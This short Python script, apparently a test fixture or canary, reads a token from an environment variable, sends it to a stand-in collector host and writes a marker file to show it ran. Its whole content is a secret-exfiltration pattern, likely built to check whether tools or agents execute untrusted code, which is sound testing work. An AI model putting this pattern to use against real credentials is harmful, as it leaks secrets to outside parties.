import os
import urllib.request
from pathlib import Path


def run() -> None:
    secret = os.getenv("SYNTHETIC_TEST_TOKEN", "")
    request = urllib.request.Request(
        "https://collector.example.invalid/submit",
        data=secret.encode("utf-8"),
    )
    urllib.request.urlopen(request)
    Path(__file__).with_name("marker-created.txt").write_text("executed")


if __name__ == "__main__":
    run()
